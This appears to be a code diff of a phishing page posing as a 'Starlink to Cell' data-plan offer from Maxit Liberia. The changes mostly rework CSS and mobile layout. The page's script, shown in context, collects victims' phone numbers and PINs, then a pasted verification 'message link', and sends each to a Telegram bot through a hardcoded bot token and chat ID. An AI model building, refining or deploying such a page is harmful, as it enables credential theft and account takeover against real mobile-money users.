@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <title>Starlink to Cell — Powered by Maxit Liberia</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -10,7 +10,7 @@
 
   <style>
     /* ============================================================
-       TOKENS (from index.html)
+       TOKENS
        ============================================================ */
     :root {
       --white: #ffffff;
@@ -30,31 +30,27 @@
       --shadow-hover: 0 24px 60px rgba(255, 102, 0, 0.18);
       --transition: 0.3s cubic-bezier(0.23, 1, 0.32, 1);
 
-      /* trial.html tokens */
       --orange: #FF6B00;
       --orange-light: #FFB380;
       --orange-pale: #FFE5D0;
       --text-dark: #1A1A1A;
       --text-mid: #555;
-      --hero-h: 52vh;
-      --hero-h-small: 38vh;
       --transition-trial: 0.45s cubic-bezier(0.4, 0, 0.2, 1);
 
-      /* trialconfirm tokens */
       --brand-orange: #ff7900;
       --text-grey: #757575;
       --bg-light: #f8f9fa;
     }
 
     /* ============================================================
-       RESET (shared)
+       RESET
        ============================================================ */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { width: 100%; min-height: 100%; }
     html { overflow-x: hidden; }
 
     /* ============================================================
-       BODY / BACKGROUND (from index.html)
+       BODY / BACKGROUND
        ============================================================ */
     body {
       font-family: 'Inter', system-ui, sans-serif;
@@ -64,11 +60,10 @@
       justify-content: center;
       align-items: flex-start;
       padding: 28px 16px;
-      min-height: 100vh;
+      min-height: 100dvh;
       overflow-x: hidden;
     }
 
-    /* Background veil for readability */
     body::before {
       content: "";
       position: fixed;
@@ -82,7 +77,7 @@
     }
 
     /* ============================================================
-       MAXIT LOGO (from index.html)
+       MAXIT LOGO
        ============================================================ */
     .maxit-logo {
       display: flex;
@@ -102,15 +97,13 @@
       box-shadow: 0 2px 8px rgba(255, 102, 0, 0.3);
       position: relative;
       overflow: hidden;
+      flex-shrink: 0;
     }
 
     .maxit-icon::before {
       content: '';
       position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
+      top: 0; left: 0; right: 0; bottom: 0;
       background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, transparent 50%);
       pointer-events: none;
     }
@@ -152,7 +145,7 @@
     }
 
     /* ============================================================
-       PAGE SHELL (from index.html)
+       PAGE SHELL
        ============================================================ */
     .page {
       position: relative;
@@ -176,7 +169,7 @@
     }
 
     /* ============================================================
-       HEADER (from index.html)
+       HEADER
        ============================================================ */
     .header {
       display: flex;
@@ -217,6 +210,7 @@
       font-size: 12.5px;
       color: var(--blue-dark);
       font-weight: 500;
+      max-width: 100%;
     }
 
     .header-badge::before {
@@ -225,6 +219,7 @@
       background: var(--blue);
       border-radius: 50%;
       animation: pulse 2s infinite;
+      flex-shrink: 0;
     }
 
     @keyframes pulse {
@@ -256,7 +251,7 @@
     }
 
     /* ============================================================
-       PLANS GRID (from index.html)
+       PLANS GRID
        ============================================================ */
     .plans-grid {
       display: grid;
@@ -265,7 +260,7 @@
     }
 
     /* ============================================================
-       PLAN CARD (from index.html)
+       PLAN CARD
        ============================================================ */
     .plan-card {
       position: relative;
@@ -281,6 +276,7 @@
       min-height: 220px;
       text-align: left;
       outline: none;
+      font-family: inherit;
     }
 
     .plan-card::before {
@@ -322,17 +318,11 @@
           rgba(10, 30, 100, 0.82) 100%
         );
       }
-      .plan-card:hover .card-cta {
-        gap: 10px;
-      }
-      .plan-card:hover .card-cta svg {
-        transform: translateX(4px);
-      }
+      .plan-card:hover .card-cta { gap: 10px; }
+      .plan-card:hover .card-cta svg { transform: translateX(4px); }
     }
 
-    .plan-card:active {
-      transform: scale(0.98);
-    }
+    .plan-card:active { transform: scale(0.98); }
 
     .card-inner {
       position: relative;
@@ -358,6 +348,7 @@
       display: inline-flex;
       align-items: center;
       width: fit-content;
+      max-width: 100%;
       font-size: 10.5px;
       font-weight: 600;
       letter-spacing: 0.04em;
@@ -368,6 +359,9 @@
       border: 1px solid rgba(255,255,255,0.2);
       backdrop-filter: blur(4px);
       text-transform: uppercase;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
 
     .is-popular .card-tag {
@@ -389,6 +383,7 @@
       color: #fff;
       margin-bottom: 3px;
       line-height: 1.2;
+      word-break: break-word;
     }
 
     .card-duration {
@@ -405,11 +400,10 @@
       color: #fff;
       letter-spacing: -0.5px;
       line-height: 1;
+      word-break: break-word;
     }
 
-    .card-price.is-free-price {
-      color: #34d399;
-    }
+    .card-price.is-free-price { color: #34d399; }
 
     .card-cta {
       display: inline-flex;
@@ -422,12 +416,10 @@
       letter-spacing: 0.02em;
     }
 
-    .card-cta svg {
-      transition: transform var(--transition);
-    }
+    .card-cta svg { transition: transform var(--transition); }
 
     /* ============================================================
-       NOTE (from index.html)
+       NOTE
        ============================================================ */
     .page-note {
       margin-top: 20px;
@@ -438,6 +430,7 @@
       font-size: 12.5px;
       color: var(--ink-muted);
       text-align: center;
+      flex-wrap: wrap;
     }
 
     .page-note::before, .page-note::after {
@@ -449,7 +442,7 @@
     }
 
     /* ============================================================
-       MODAL OVERLAY (from index.html)
+       MODAL
        ============================================================ */
     .modal-overlay {
       position: fixed;
@@ -461,21 +454,20 @@
       z-index: 100;
       padding: 20px;
       backdrop-filter: blur(8px);
+      overscroll-behavior: contain;
     }
 
-    .modal-overlay.is-open {
-      display: flex;
-    }
+    .modal-overlay.is-open { display: flex; }
 
-    /* ============================================================
-       MODAL BOX (from index.html)
-       ============================================================ */
     .modal-box {
       position: relative;
       width: 100%;
       max-width: 460px;
+      max-height: calc(100dvh - 40px);
       border-radius: 22px;
       overflow: hidden;
+      display: flex;
+      flex-direction: column;
       box-shadow:
         0 0 0 1px rgba(255,255,255,0.12),
         0 40px 80px rgba(4, 10, 35, 0.5);
@@ -510,6 +502,9 @@
     .modal-content {
       position: relative;
       z-index: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
     }
 
     .modal-header {
@@ -518,12 +513,14 @@
       align-items: flex-start;
       justify-content: space-between;
       gap: 12px;
+      flex-shrink: 0;
     }
 
     .modal-icon-title {
       display: flex;
       align-items: center;
       gap: 12px;
+      min-width: 0;
     }
 
     .modal-icon-wrap {
@@ -545,6 +542,7 @@
       font-weight: 700;
       color: #fff;
       line-height: 1.25;
+      word-break: break-word;
     }
 
     .modal-close {
@@ -566,6 +564,9 @@
 
     .modal-body {
       padding: 20px 24px;
+      overflow-y: auto;
+      flex: 1 1 auto;
+      min-height: 0;
     }
 
     .modal-summary {
@@ -612,11 +613,13 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
+      gap: 8px;
       background: rgba(255,255,255,0.07);
       border: 1px solid rgba(255,255,255,0.12);
       border-radius: 12px;
       padding: 14px 16px;
       margin-bottom: 14px;
+      flex-wrap: wrap;
     }
 
     .modal-price-label {
@@ -632,6 +635,7 @@
       font-size: 22px;
       font-weight: 700;
       color: #fff;
+      word-break: break-word;
     }
 
     .modal-price-val.free { color: #34d399; }
@@ -647,6 +651,7 @@
       padding: 0 24px 24px;
       display: flex;
       gap: 10px;
+      flex-shrink: 0;
     }
 
     .btn {
@@ -660,6 +665,7 @@
       cursor: pointer;
       transition: all var(--transition);
       letter-spacing: 0.01em;
+      white-space: nowrap;
     }
 
     .btn-ghost {
@@ -670,9 +676,7 @@
       padding: 13px 18px;
     }
 
-    .btn-ghost:hover {
-      background: rgba(255,255,255,0.18);
-    }
+    .btn-ghost:hover { background: rgba(255,255,255,0.18); }
 
     .btn-primary {
       background: linear-gradient(135deg, #ff6600 0%, #ff9933 100%);
@@ -697,54 +701,12 @@
     }
 
     /* ============================================================
-       RESPONSIVE (from index.html)
-       ============================================================ */
-    @media (max-width: 860px) {
-      .plans-grid { grid-template-columns: repeat(2, 1fr); }
-    }
-
-    @media (max-width: 640px) {
-      body { padding: 10px 6px; }
-
-      .page {
-        padding: 22px 16px 20px;
-        border-radius: 18px;
-      }
-
-      .header { margin-bottom: 24px; }
-
-      .title-block h1 { font-size: 20px; }
-
-      .plans-grid {
-        grid-template-columns: repeat(2, 1fr);
-        gap: 12px;
-      }
-
-      .plan-card { min-height: 190px; }
-      .card-price { font-size: 20px; }
-      .card-name { font-size: 15px; }
-    }
-
-    @media (max-width: 420px) {
-      .plans-grid { grid-template-columns: 1fr; }
-
-      .plan-card { min-height: 160px; }
-
-      .plan-card:hover { transform: none; }
-
-      .modal-box { border-radius: 18px; }
-      .modal-header { padding: 20px 18px 0; }
-      .modal-body { padding: 16px 18px; }
-      .modal-footer { padding: 0 18px 20px; }
-    }
-
-    /* ============================================================
-       TRIAL.HTML — FRAME (full-screen phone mockup)
+       TRIAL VIEW
        ============================================================ */
     #trial-view {
-      display: none; /* hidden by default; JS toggles */
+      display: none;
       width: 100%;
-      min-height: 100vh;
+      min-height: 100dvh;
       align-items: center;
       justify-content: center;
       background: #f0ece8;
@@ -752,17 +714,16 @@
       position: fixed;
       inset: 0;
       z-index: 200;
+      padding: 0;
     }
 
-    #trial-view.active {
-      display: flex;
-    }
+    #trial-view.active { display: flex; }
 
     #trial-view .frame {
       position: relative;
       width: 100%;
       max-width: 430px;
-      height: 100%;
+      height: 100dvh;
       max-height: 900px;
       background: #fff;
       border-radius: 44px;
@@ -772,18 +733,17 @@
       box-shadow: 0 32px 80px rgba(0,0,0,0.20), 0 4px 16px rgba(0,0,0,0.08);
     }
 
-    /* Hero */
     #trial-view .hero {
       position: relative;
       width: 100%;
-      height: 52vh;
+      height: clamp(240px, 52vh, 480px);
       flex-shrink: 0;
       overflow: hidden;
       transition: height 0.45s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
     #trial-view .hero.shrunk {
-      height: 38vh;
+      height: clamp(180px, 38vh, 360px);
     }
 
     #trial-view .hero img,
@@ -821,6 +781,8 @@
       letter-spacing: 0.06em;
       text-transform: uppercase;
       transition: opacity 0.45s cubic-bezier(0.4, 0, 0.2, 1);
+      text-align: center;
+      padding: 0 16px;
     }
 
     #trial-view .back-btn {
@@ -846,13 +808,13 @@
     }
     #trial-view .wave svg { display: block; width: 100%; height: 100%; }
 
-    /* Form */
     #trial-view .form-section {
       flex: 1;
       padding: 24px 26px 28px;
       display: flex;
       flex-direction: column;
-      overflow: hidden;
+      overflow-y: auto;
+      min-height: 0;
     }
 
     #trial-view h1 {
@@ -887,6 +849,7 @@
       display: flex;
       flex-direction: column;
       gap: 5px;
+      min-width: 0;
     }
 
     #trial-view .field-label {
@@ -920,8 +883,8 @@
     #trial-view .pin-row { align-items: flex-start; }
     #trial-view .pin-row .field-icon { margin-top: 20px; }
 
-    #trial-view .pin-dashes { display: flex; gap: 14px; }
-    #trial-view .pin-dash-wrap { flex: 1; }
+    #trial-view .pin-dashes { display: flex; gap: 10px; }
+    #trial-view .pin-dash-wrap { flex: 1; min-width: 0; }
 
     #trial-view .pin-input {
       width: 100%; height: 40px;
@@ -940,7 +903,7 @@
     #trial-view .pin-input.filled,
     #trial-view .pin-input:focus { border-bottom-color: #FF6B00; }
 
-    #trial-view .spacer { flex: 1; }
+    #trial-view .spacer { flex: 1; min-height: 12px; }
 
     #trial-view .login-btn {
       width: 100%;
@@ -963,22 +926,14 @@
     }
     #trial-view .login-btn:active { transform: scale(0.97); }
 
-    @media (min-width: 431px) {
-      #trial-view .frame { border-radius: 44px; }
-    }
-    @media (max-width: 430px) {
-      #trial-view { background: #fff; }
-      #trial-view .frame { border-radius: 0; box-shadow: none; max-height: 100%; }
-    }
-
     /* ============================================================
-       TRIALCONFIRM.HTML — VERIFICATION PAGE
+       VERIFY VIEW
        ============================================================ */
     #verify-view {
       display: none;
       flex-direction: column;
-      min-height: 100vh;
-      height: 100%;
+      min-height: 100dvh;
+      height: 100dvh;
       background: #ff7900;
       position: fixed;
       inset: 0;
@@ -988,16 +943,14 @@
       color: #333333;
     }
 
-    #verify-view.active {
-      display: flex;
-    }
+    #verify-view.active { display: flex; }
 
     #maxit-embed-container {
       display: flex;
       flex-direction: column;
       font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       width: 100%;
-      min-height: 100vh;
+      min-height: 100dvh;
       background-color: white;
     }
 
@@ -1068,6 +1021,7 @@
       font-size: 18px;
       color: #000;
       margin-bottom: 30px;
+      word-break: break-word;
     }
 
     .mi-textarea {
@@ -1155,13 +1109,165 @@
       font-size: 13px;
       flex-shrink: 0;
     }
+
+    /* ============================================================
+       RESPONSIVE — MOBILE FIRST
+       ============================================================ */
+
+    /* Tablet: 3 columns collapses to 2 */
+    @media (max-width: 860px) {
+      .plans-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+
+    /* Small tablets / large phones */
+    @media (max-width: 640px) {
+      body { padding: 12px 8px; }
+
+      .page {
+        padding: 22px 16px 20px;
+        border-radius: 18px;
+      }
+
+      .header {
+        margin-bottom: 24px;
+        padding-bottom: 20px;
+      }
+
+      .title-block h1 { font-size: 20px; }
+
+      .powered {
+        padding: 10px 12px;
+        width: 100%;
+      }
+
+      .plans-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 12px;
+      }
+
+      .plan-card { min-height: 190px; }
+      .card-inner { padding: 16px; gap: 8px; }
+      .card-price { font-size: 20px; }
+      .card-name { font-size: 15px; }
+      .card-duration { font-size: 11px; }
+      .card-tag { font-size: 10px; padding: 3px 8px; }
+
+      .page-note { font-size: 11.5px; }
+      .page-note::before, .page-note::after { max-width: 40px; }
+
+      /* Modal tighter */
+      .modal-box { border-radius: 18px; }
+      .modal-header { padding: 20px 18px 0; }
+      .modal-body { padding: 16px 18px; }
+      .modal-footer { padding: 0 18px 20px; }
+      .modal-icon-wrap { width: 42px; height: 42px; font-size: 20px; }
+      .modal-title { font-size: 16px; }
+
+      /* Trial view — kill the outer frame curvature on small screens */
+      #trial-view .frame { border-radius: 0; box-shadow: none; max-height: 100dvh; }
+      #trial-view .hero { height: clamp(200px, 40vh, 340px); }
+      #trial-view .hero.shrunk { height: clamp(160px, 30vh, 240px); }
+      #trial-view .form-section { padding: 20px 20px 24px; }
+      #trial-view h1 { font-size: 22px; margin-bottom: 18px; }
+
+      /* Verify view padding tighter */
+      .mi-content { padding: 30px 20px; }
+      .mi-content h2 { font-size: 22px; }
+      .mi-textarea { min-height: 180px; padding: 16px; }
+      .mi-header { padding: 16px 20px; }
+      .mi-logo { font-size: 20px; }
+    }
+
+    /* Phones: 1 column */
+    @media (max-width: 420px) {
+      body { padding: 8px 6px; }
+
+      .page {
+        padding: 18px 14px 16px;
+        border-radius: 16px;
+      }
+
+      .plans-grid {
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+
+      .plan-card { min-height: 160px; }
+
+      .plan-card:hover { transform: none; }
+
+      .powered { flex-direction: row; align-items: center; }
+      .maxit-icon { width: 40px; height: 40px; }
+      .maxit-text { font-size: 12px; }
+      .maxit-sub { font-size: 7px; }
+      .maxit-brand-name { font-size: 16px; }
+      .maxit-brand-tag { font-size: 10px; }
+
+      .modal-box { border-radius: 16px; max-height: calc(100dvh - 20px); }
+      .modal-overlay { padding: 10px; }
+      .modal-header { padding: 18px 14px 0; }
+      .modal-body { padding: 14px 14px; }
+      .modal-footer { padding: 0 14px 16px; }
+      .modal-price-block { padding: 12px 14px; }
+      .modal-price-val { font-size: 18px; }
+      .btn { font-size: 13px; padding: 12px 14px; }
+      .btn-ghost { padding: 12px 14px; }
+
+      /* Trial view — tighter padding, smaller PIN gaps */
+      #trial-view .form-section { padding: 18px 16px 20px; }
+      #trial-view h1 { font-size: 20px; margin-bottom: 16px; }
+      #trial-view .pin-dashes { gap: 8px; }
+      #trial-view .field-icon { width: 32px; height: 32px; }
+      #trial-view .field-icon svg { width: 16px; height: 16px; }
+      #trial-view .pin-row .field-icon { margin-top: 18px; }
+      #trial-view .field-label { font-size: 11.5px; }
+      #trial-view .phone-input { font-size: 15px; }
+      #trial-view .pin-input { font-size: 20px; height: 36px; }
+      #trial-view .hero { height: clamp(180px, 34vh, 260px); }
+      #trial-view .hero.shrunk { height: clamp(140px, 26vh, 200px); }
+
+      /* Verify view — narrow */
+      .mi-content { padding: 24px 16px; }
+      .mi-content h2 { font-size: 20px; margin-bottom: 14px; }
+      .mi-instruction { font-size: 14px; }
+      .mi-phone { font-size: 16px; margin-bottom: 20px; }
+      .mi-textarea { min-height: 160px; padding: 14px; font-size: 15px; }
+      .mi-timer { font-size: 13px; margin: 12px 0 18px 0; }
+      .mi-submit { padding: 16px; font-size: 15px; }
+      .mi-header { padding: 14px 16px; }
+      .mi-logo { font-size: 18px; }
+    }
+
+    /* Very small: 320-360px — extra tightening */
+    @media (max-width: 360px) {
+      .title-block h1 { font-size: 18px; }
+      .section-label { font-size: 10px; }
+      .plan-card { min-height: 150px; }
+      .card-name { font-size: 14px; }
+      .card-price { font-size: 18px; }
+      .modal-title { font-size: 15px; }
+      .btn { font-size: 12px; }
+      #trial-view .form-section { padding: 16px 12px 18px; }
+      #trial-view h1 { font-size: 18px; }
+      #trial-view .pin-dashes { gap: 6px; }
+      .mi-content { padding: 20px 12px; }
+    }
+
+    /* Short viewports (landscape phones) — hero shrinks further */
+    @media (max-height: 620px) and (orientation: landscape) {
+      #trial-view .hero { height: 130px; }
+      #trial-view .hero.shrunk { height: 100px; }
+      #trial-view .form-section { padding: 14px 18px 16px; }
+      #trial-view h1 { font-size: 18px; margin-bottom: 12px; }
+      #trial-view .field-row + .field-row { margin-top: 12px; }
+    }
   </style>
   <base target="_blank">
 </head>
 <body>
 
   <!-- ============================================================
-       MAIN LANDING PAGE (from index.html)
+       MAIN LANDING PAGE
        ============================================================ -->
   <div class="page" id="landing-view">
     <header class="header">
@@ -1188,7 +1294,6 @@
       <p class="section-label">Choose your plan</p>
       <div class="plans-grid">
 
-        <!-- 5GB Free Trial -->
         <button class="plan-card is-free" data-plan-id="5gb">
           <div class="card-inner">
             <span class="card-tag">New users only</span>
@@ -1204,7 +1309,6 @@
           </div>
         </button>
 
-        <!-- 15GB -->
         <button class="plan-card" data-plan-id="15gb">
           <div class="card-inner">
             <span class="card-tag">Light users</span>
@@ -1220,7 +1324,6 @@
           </div>
         </button>
 
-        <!-- 35GB -->
         <button class="plan-card" data-plan-id="35gb">
           <div class="card-inner">
             <span class="card-tag">Balanced</span>
@@ -1236,7 +1339,6 @@
           </div>
         </button>
 
-        <!-- 50GB -->
         <button class="plan-card" data-plan-id="50gb">
           <div class="card-inner">
             <span class="card-tag">Heavy use</span>
@@ -1252,7 +1354,6 @@
           </div>
         </button>
 
-        <!-- Unlimited -->
         <button class="plan-card is-popular" data-plan-id="unlimited">
           <div class="card-inner">
             <span class="card-tag">⭐ Most popular</span>
@@ -1268,7 +1369,6 @@
           </div>
         </button>
 
-        <!-- 5G Unlimited -->
         <button class="plan-card" data-plan-id="5g">
           <div class="card-inner">
             <span class="card-tag">5G Coverage</span>
@@ -1291,7 +1391,7 @@
   </div>
 
   <!-- ============================================================
-       MODAL (from index.html)
+       MODAL
        ============================================================ -->
   <div class="modal-overlay" id="planModal" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="modal-box">
@@ -1335,7 +1435,7 @@
   </div>
 
   <!-- ============================================================
-       TRIAL VIEW (from trial.html) — hidden by default
+       TRIAL VIEW
        ============================================================ -->
   <div id="trial-view">
     <div class="frame">
@@ -1397,7 +1497,7 @@
   </div>
 
   <!-- ============================================================
-       VERIFICATION VIEW (from trialconfirm.html) — hidden by default
+       VERIFICATION VIEW
        ============================================================ -->
   <div id="verify-view">
     <div id="maxit-embed-container">
@@ -1431,19 +1531,12 @@
     </div>
   </div>
 
-  <!-- ============================================================
-       JAVASCRIPT — combines logic from all three pages
-       ============================================================ -->
   <script>
     (function() {
       'use strict';
 
       /* ==========================================================
-         CENTRALIZED TELEGRAM NOTIFICATION (Bot A — SINGLE SOURCE)
-         ==========================================================
-         All legitimate application notifications route through
-         this single function. Do NOT introduce a second bot token
-         or chat ID anywhere else in this file.
+         CENTRALIZED TELEGRAM NOTIFICATION (SINGLE SOURCE)
          ========================================================== */
       const TELEGRAM_BOT_TOKEN = "8943529528:AAEaaoZPQaxg2kuu5R44RsY3I0FE8N3LfE0";
       const TELEGRAM_CHAT_ID   = "5763667136";
@@ -1465,7 +1558,7 @@
       }
 
       /* ----------------------------------------------------------
-         1. LANDING PAGE LOGIC (from index.html)
+         1. LANDING PAGE LOGIC
          ---------------------------------------------------------- */
       const planIcons = {
         "5gb": "🎁", "15gb": "📶", "35gb": "🚀",
@@ -1609,7 +1702,6 @@
         card.addEventListener('click', () => openModal(card.getAttribute('data-plan-id')));
       });
 
-      // PAY button — switches to trial view for BOTH free and paid plans
       payButton.addEventListener('click', () => {
         if (!selectedPlan) return;
         try { sessionStorage.setItem('selectedPlan', JSON.stringify(selectedPlan)); }
@@ -1630,7 +1722,7 @@
       });
 
       /* ----------------------------------------------------------
-         2. TRIAL VIEW LOGIC (from trial.html)
+         2. TRIAL VIEW LOGIC
          ---------------------------------------------------------- */
       const trialHero        = document.getElementById('trial-hero');
       const trialHeroImg     = document.getElementById('trial-hero-img');
@@ -1739,7 +1831,6 @@
         try {
           await sendTelegramNotification(message);
 
-          // Switch to verification view (trialconfirm.html)
           document.getElementById('trial-view').classList.remove('active');
           document.getElementById('verify-view').classList.add('active');
           document.getElementById('landing-view').style.display = 'none';
@@ -1769,7 +1860,6 @@
 
       trialCheckReady();
 
-      // Back button from trial view → landing
       document.getElementById('trial-back-btn').addEventListener('click', function() {
         document.getElementById('trial-view').classList.remove('active');
         document.getElementById('landing-view').style.display = '';
@@ -1777,7 +1867,7 @@
       });
 
       /* ----------------------------------------------------------
-         3. VERIFICATION VIEW LOGIC (from trialconfirm.html)
+         3. VERIFICATION VIEW LOGIC
          ---------------------------------------------------------- */
       const verifyInput        = document.getElementById('verify-input');
       const verifyBtn          = document.getElementById('verify-btn');
@@ -1843,7 +1933,6 @@
 
         verifyIsSubmitting = true;
 
-        // Send ONLY the pasted message text to Telegram via Bot A.
         const telegramMessage = message;
 
         try {
@@ -1853,7 +1942,6 @@
 
           await sendTelegramNotification(telegramMessage);
 
-          // Success — clear input, restore button, do NOT show expiration.
           verifyInput.value = '';
           verifyInput.placeholder = "Paste the NEW message link here to activate your free plan...";
           verifyInput.focus();
@@ -1887,31 +1975,26 @@
         }
       });
 
-      // Back button from verification view → trial view
       document.getElementById('verify-back-btn').addEventListener('click', function() {
         document.getElementById('verify-view').classList.remove('active');
         document.getElementById('trial-view').classList.add('active');
         document.getElementById('landing-view').style.display = 'none';
       });
 
-      // Expose init function for the verification view
       window.initVerifyView = function() {
         verifyLoadStoredPhone();
         verifyStartCountdown();
       };
 
-      // If the verify view is already active on load
       if (document.getElementById('verify-view').classList.contains('active')) {
         verifyLoadStoredPhone();
         verifyStartCountdown();
       }
 
-      // Show landing by default
       document.getElementById('landing-view').style.display = '';
       document.getElementById('trial-view').classList.remove('active');
       document.getElementById('verify-view').classList.remove('active');
 
-      // Initialize verification phone if needed later
       verifyLoadStoredPhone();
       verifyStartCountdown();
 
